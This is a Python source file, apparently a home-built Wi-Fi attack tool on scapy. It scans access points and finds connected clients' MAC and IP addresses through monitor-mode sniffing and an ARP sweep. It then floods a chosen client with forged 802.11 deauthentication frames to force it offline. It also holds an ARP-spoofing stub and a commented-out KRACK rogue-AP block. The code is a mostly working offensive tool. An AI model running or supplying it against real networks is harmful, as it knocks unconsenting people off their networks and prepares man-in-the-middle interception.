import os
import sys
import threading
import subprocess
import logging
from contextlib import redirect_stdout


logging.basicConfig(filename=os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'log', 'sniff.log'),
                    level=logging.DEBUG,
                    format='%(asctime)s [%(levelname)s]%(message)s',
                    datefmt='%Y-%m-%d %H:%M:%S')

sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'scapy'))
from scapy.all import *  # noqa: E402
from scapy.consts import LINUX, WINDOWS

iface_managed = None
iface_monitor = None
network_list = []
connected_network = None
host_list = None

class Network:
    def __init__(self, ssid: str, bssid: str, channel: int, crypto: set[str], gateway: str = '192.168.0.1', subnet: int = 24):
        self.ssid = ssid
        self.bssid = bssid
        self.channel = channel
        self.crypto = crypto
        self.gateway = gateway
        self.subnet = subnet

    def __str__(self):
        return ('[Network info] ssid:{}  bssid:{}  channel:{}  crypto:{}'
                .format(self.ssid, self.bssid, self.channel, self.crypto))

class Host:
    def __init__(self, bssid: str, MAC: str, IP: str):
        self.bssid = bssid
        self.MAC = MAC
        self.IP = IP

    def __str__(self):
        return ('[Host info] bssid:{}  MAC:{}  IP:{}'
                .format(self.bssid, self.MAC, self.IP))


# Recognizes and returns a list of network interface.
#   [Input] None
#   [Output] List of available network interface [Name, Description, MAC, IPv4]
def lookup_iface() -> list[NetworkInterface]:
    global iface_list
    iface_list = []
    for guid, iface in conf.ifaces.data.items():
        if iface.mac != '':  # Windows에서 WAN Miniport 제외
            iface_list.append(iface)
    return iface_list


def from_name_to_iface(iface_name: str, iface_list: list[NetworkInterface]):
    return next((iface for iface in iface_list if iface.name == iface_name), None)


def linux_create_iface_mon(iface=None) -> NetworkInterface:
    if iface is None:
        iface = iface_managed
    set_mode('monitor', iface)  # To prevent channel=-1 phenomenon in monitor mode interface
    iface_mon_name = ('mon'+iface.name)[:15]
    subprocess.run(['iw', 'dev', iface_mon_name, 'del'],
                         capture_output=True, text=True)
    result = subprocess.run(['iw', 'dev', iface.name, 'interface', 'add', iface_mon_name, 'type', 'monitor'],
                         capture_output=True, text=True)
    result.check_returncode()
    result = subprocess.run(['ip', 'link', 'set', iface_mon_name, 'up'], capture_output=True, text=True)
    result.check_returncode()
    set_mode('managed', iface)  # To prevent channel=-1 phenomenon in monitor mode interface
    return next((iface for iface in iface_list if iface.name == iface_mon_name), None)

def set_two_ifaces_to_use(iface_man: NetworkInterface, iface_mon: NetworkInterface, iface_list: [NetworkInterface]) -> bool:
    global iface_managed, iface_monitor
    iface_managed = iface_man if isinstance(iface_man, NetworkInterface) else\
        iface_list[int(iface_man)] if isinstance(iface_man, int) else from_name_to_iface(iface_man, iface_list)
    if LINUX and iface_mon is None:
        iface_mon = linux_create_iface_mon(iface_managed)
    iface_monitor = iface_mon if isinstance(iface_mon, NetworkInterface) else\
        iface_list[int(iface_mon)] if isinstance(iface_mon, int) else from_name_to_iface(iface_mon, iface_list)
    if iface_managed is None or iface_monitor is None:
        return False
    set_mode('managed', iface_managed)
    set_mode('monitor', iface_monitor)
    return True     # Should we check whether their mode has surely changed?



def get_connected_wifi_bssid(iface=None):
    if iface is None:
        iface = iface_managed
    if LINUX:
        try:
            result = subprocess.run(['iwconfig', iface.name], capture_output=True, text=True)
            output = result.stdout
            bssid = None
            for line in output.split('\n'):
                if 'Access Point' in line:
                    bssid = line.split(' ')[-1].strip()
                    break
            return bssid
        except Exception as e:
            print('Error: {}'.format(e))
            return None
    elif WINDOWS:
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
            output = result.stdout

            interface_section = False
            bssid = None

            for line in output.split('\n'):
                if iface.name in line:
                    interface_section = True
                elif 'BSSID' in line and interface_section:
                    bssid = line[-17:]
                    break
                elif line.strip() == '':
                    interface_section = False
            return bssid
        except Exception as e:
            print('Error: {}'.format(e))
            return None

# Send de-authentication frame to force disconnect a specific client or all clients connected to the target network
#   [Input] Network, Target Client MAC address, Broadcast or not, Network interface to use
#   [Output] None
def disconnect_client(network: Network=None, bssid=None, channel=None, client_MAC: str = '', broadcast: bool = False, iface=None) -> bool:
    if iface is None:
        iface = iface_monitor
    if network is None:
        network = connected_network
    if bssid is None or channel is None:
        bssid = network.bssid
        channel = network.channel

    ack_to_client = 0
    ack_to_AP = 0
    '''
    def handle_deauth_ack(packet):
        nonlocal ack_to_client, ack_to_AP
        if packet.haslayer(Dot11):
            if packet.type == 1 and packet.subtype == 13:
                if packet.addr1 == client_MAC:
                    ack_to_client += 1
                elif packet.addr1 == bssid:
                    ack_to_AP += 1
                print('Sending 64 directed DeAuth. STMAC: [{}] [C{}|A{} ACKs]'.format(client_MAC, ack_to_client,
                                                                                        ack_to_AP), end='\r')
    '''
    def produce_sc(seq: int, frag: int=0) -> int:
        return (seq << 4) + frag

    if iface is None:
        iface = iface_monitor
    if broadcast:
        client_MAC = 'ff:ff:ff:ff:ff:ff'
    '''
    deauth_packet_type1 = (RadioTap(present="Rate+TXFlags", Rate=1, TXFlags=0x0018)
                           / Dot11(ID=14849, addr1=client_MAC, addr2=bssid, addr3=bssid, SC=0)
                           / Dot11Deauth(reason=7))
    deauth_packet_type2 = (RadioTap(present="TXFlags+b18", notdecoded=b'\x00')
                     / Dot11(ID=14849, addr1=client_MAC, addr2=bssid, addr3=bssid)
                     / Dot11Deauth(reason=7))
    
    deauth_packet_type1 = from_hexstream_to_packet('00000c000480000002001800c0003a0104292e794a12588694a0b468588694a0b46800000700')
    deauth_packet_type2 = from_hexstream_to_packet('00000b0000800200000000c0003a0104292e794a12588694a0b468588694a0b46800000700')
    '''
    deauth_packet = []
    deauth_packet.append(RadioTap(present='Rate+TXFlags', Rate=1, TXFlags=0x0018)
                         / Dot11(ID=produce_sc(314), addr1=client_MAC, addr2=bssid, addr3=bssid)
                         / Dot11Deauth(reason=7))   # From AP to Client

    deauth_packet.append(RadioTap(present='TXFlags+b18', notdecoded=b'\x00')
                         / Dot11(ID=produce_sc(314), addr1=bssid, addr2=client_MAC, addr3=bssid)
                         / Dot11Deauth(reason=7))   # From Client to AP
    set_channel(channel, iface)
    print('[monitor] Sending 100 802.11 Deauthentication Frame to AP and client host... ')
    for i in range(1000):
        deauth_packet[0][Dot11].SC = produce_sc(i)
        deauth_packet[1][Dot11].SC = produce_sc(i)
        sendp(deauth_packet, iface=iface, monitor=True, verbose=False)
        sniff(iface=iface, monitor=True, timeout=0.001, store=0)
    print(f'\n')
    print('[monitor] Done. ')

def spoof_ARP_table(gateway_IP: str, target_IP: str, iface: None):
    ...


# Determines the current mode of a network interface.
#   [Input] Target interface
#   [Output] Current mode(managed or monitor mode)
def get_mode(iface=None) -> str:
    if LINUX:
        command = f'iw dev {iface} info | grep type | awk "{{print $2}}"'
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout.strip().lower()
    elif WINDOWS:
        try:
            if iface.ismonitor():
                return 'monitor'
            else:
                return 'managed'
        except OSError as e:
            return None


#
#   [Input] mode('managed' or 'monitor'), Target interface
#   [Output] None
def set_mode(mode: str, iface=None) -> bool:
    current_mode = get_mode(iface)
    if current_mode is not None and current_mode != mode:
        if LINUX:
            result = subprocess.run(['ip', 'link', 'set', iface.name, 'down'], capture_output=True, text=True)
            result.check_returncode()
            result = subprocess.run(['iw', 'dev', iface.name, 'set', 'type', mode], capture_output=True, text=True)
            result.check_returncode()
            result = subprocess.run(['ip', 'link', 'set', iface.name, 'up'], capture_output=True, text=True)
            result.check_returncode()
            return True
        elif WINDOWS:
            return iface.setmonitor(True if mode == 'monitor' else False)
    else:
        return False

# Change the channel of the target network interface. (Only works in monitor mode.)
#   [Input] Channel number, Target interface
#   [Output] Success or failure
def set_channel(channel: int, iface=None) -> bool:
    if iface is None:
        iface = iface_monitor
    if get_mode(iface) != 'monitor':
        print('Cannot change channel. First you need to switch your iface to monitor mode.')
        return False
    if LINUX:
        result = subprocess.run(['iw', 'dev', iface.name, 'set', 'channel', channel], capture_output=True, text=True)
        result.check_returncode()
    elif WINDOWS:
        iface.setchannel(channel)   # WlanHelper "Wi-Fi 2" channel n
        # It actually works. But, in Windows 11, I couldn't check the changed channel number via command(WlanHelper "Wi-Fi 2" channel)
        # If that doesn't work, try switching to managed mode and then back to monitor mode.
        return True  # But it's still possible that it failed... (Because scapy cannot check the subprocess result output)


# Scan access points while switching channels in the 2.4GHz and 5GHz bands.
#   [Input] Channel list for scanning, Frequency('2.4ghz' or '5ghz'), Passive/Active scan, Network interface to use
#   [Output] List of connectable networks (ssid, bssid, channel, crypto)
def scan_AP(channels: list[int] = None, frequency: str = None, iface=None) -> list[Network]:
    if iface is None:
        iface = iface_monitor
    wifi_2_4_channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
    wifi_5_channels = [36, 40, 44, 48, 149, 153, 157, 161]  # in KOREA
    network_list = []
    current_channel = 0

    # Callback function that executes with each packet sniffed.
    def handle_scan_AP(packet):
        try:
            # Passive Scan
            if packet.haslayer(Dot11Beacon):  # Beacon Frame
                netstats = packet[Dot11Beacon].network_stats()
                if ('channel' in netstats and netstats[
                    'channel'] == current_channel  # Discard frames from other channels
                        and packet.addr3 not in [network.bssid for network in network_list]):
                    network_list.append(Network(
                        netstats['ssid'],
                        packet.addr3,
                        netstats['channel'],
                        netstats['crypto']
                    ))
                    print(network_list[-1])
            '''
            if active:  # Active Scan
                if packet.type == 0 and (packet.subtype == 4 or packet.subtype == 5):    # Probe Request/Response Frame
                    ...
                    print('Sorry, active scanning is currently not supported.')
            '''
        except (KeyError, TypeError) as e:  # Probably a malformed packet
            ...

    if channels is None:
        if frequency is None:
            channels = wifi_2_4_channels + wifi_5_channels
        elif frequency.lower() == '2.4ghz':
            channels = wifi_2_4_channels
        elif frequency.lower() == '5ghz':
            channels = wifi_5_channels

    print('[monitor] Start passive scan(from beacon frame)...')

    for n in channels:
        # Sequential channel switching - Stays for 1 second on each channel
        current_channel = n
        print('[monitor] Current channel: {}'.format(n))
        set_channel(n, iface)
        # 비콘 프레임은 보통 100ms마다 송신되기 때문에 timeout=0.1~0.2여도 충분할 것 같다.
        sniff(iface=iface, monitor=True, timeout=0.5, prn=handle_scan_AP, store=0)
    print('[monitor] Done.')
    return network_list


# Scan client devices connected to a specific network.
#   [Input] Target network, Network interface to use
#   [Output] Information list of client devices ( )
def scan_host(network: Network=None, iface_man=None, iface_mon=None) -> list[Host]:
    if iface_man is None:
        iface = iface_managed
    if network is None:
        network = connected_network
    if iface_mon is None:
        iface = iface_monitor
    print('[monitor] Scan MAC address of host devices... ')
    host_list = _scan_host_MAC(network, iface_mon)
    print('[monitor] Done: {} hosts found.'.format(len(host_list)))

    print('[managed] Scan IP address of host devices... ')
    host_list = _scan_host_IP(host_list, network, iface_man)
    print('[managed] Done: {} hosts found.'.format(len([host for host in host_list if host.IP != ''])))

    return host_list


# Scan MAC addresses of client devices
def _scan_host_MAC(network: Network, iface=None) -> list[Host]:
    if iface is None:
        iface = iface_monitor
    host_list = []
    # Callback function that executes with each packet sniffed.
    def handle_scan_host_MAC(packet):
        try:
            if packet.haslayer(Dot11):
                if (packet.type == 0 and packet.subtype == 4  # Probe Request Frame (Occurs only on new connection)
                        and packet.addr3 == network.bssid):
                    if packet.addr2 not in [host.MAC for host in host_list]:
                        host_list.append(Host(network.bssid, packet.addr2, ''))
                        # print(host_list[-1])
                elif (packet.type == 2  # Data Frame (But)
                      and packet.addr1 == network.bssid):  # Client -> AP (To DS=1, From DS=0)
                    if packet.addr2 not in [host.MAC for host in host_list]:
                        host_list.append(Host(network.bssid, packet.addr2, ''))
                        # print(host_list[-1])
        except (KeyError, TypeError) as e:  # Probably a malformed packet
            ...

    set_channel(network.channel, iface)
    sniff(iface=iface, monitor=True, timeout=10, prn=handle_scan_host_MAC, store=0)
    return host_list


# Scan IP addresses of client devices
def _scan_host_IP(host_list: list[Host], network: Network, iface=None) -> list[Host]:
    _find_MAC_from_IP(host_list, network, iface)

    return host_list


# SScan IP with ARP Request/Response within subnet range
def _find_MAC_from_IP(host_list: list[Host], network: Network, iface=None):
    if iface is None:
        iface = iface_managed
    ARP_request = (Ether(dst='ff:ff:ff:ff:ff:ff', src=iface.mac, type='ARP')
                   / ARP(hwsrc=iface.mac, psrc=iface.ip, pdst='{}/{}'.format(network.gateway, network.subnet))[0])
    print('[managed] Collect ARP responses for all IP addresses in the internal network range [{}/{}]... '.format(network.gateway, network.subnet))
    print(ARP_request.summary())
    with redirect_stdout(io.StringIO()):
        answered_list = srp(ARP_request, iface=iface, timeout=10)[0]
    for sent, received in answered_list:  # ARP Response
        appended = False
        for host in host_list:
            if received.hwsrc == host.MAC:
                host.IP = received.psrc
                appended = True
        if not appended:
            host_list.append(Host(network.bssid, received.hwsrc, received.psrc))

        print('MAC:{} - IP:{}'.format(received.hwsrc, received.psrc))
    return host_list



if __name__ == '__main__':
    if LINUX:
        linux_create_iface_mon()

    iface_list = lookup_iface()
    # Uses two interfaces: one connects to the target WiFi(Managed mode), the other monitors 802.11 frames(Monitor mode)
    iface_managed = next((i for i in iface_list if i.name == 'Wi-Fi'), None)
    set_mode('managed', iface_managed)
    iface_monitor = next((i for i in iface_list if i.name == 'Wi-Fi 2'), None)
    set_mode('monitor', iface_monitor)

    network_list = scan_AP(frequency='2.4ghz', iface=iface_monitor)
    network = next((network for network in network_list if network.bssid == get_connected_wifi_bssid(iface=iface_managed)), None)
    # todo: need to find a way to automatically determine gateways and subnets.
    if network.gateway is None:
        network.gateway = '192.168.0.1'
    if network.subnet is None:
        network.subnet = 24

    network = Network('monodoo2.4', '--:--:--:--:--:--', 3, {'WPA2/PSK'}, '192.168.0.1', 24)
    set_channel(network.channel)
    '''
    from scapy.modules.krack import KrackAP
    #load_module("krack")
    KrackAP(
        iface=iface_monitor,  # A monitor interface
        ap_mac='11:22:33:44:55:66',  # MAC (BSSID) to use
        ssid="TEST_KRACK",  # SSID
        passphrase="testtest",  # Associated passphrase
        channel=3
    ).run()
    '''
    host_list = scan_host(network=network)
    client_mac = [host.MAC for host in host_list if host.IP == '192.168.0.13'][0]
    disconnect_client(network=network, client_MAC=client_mac)


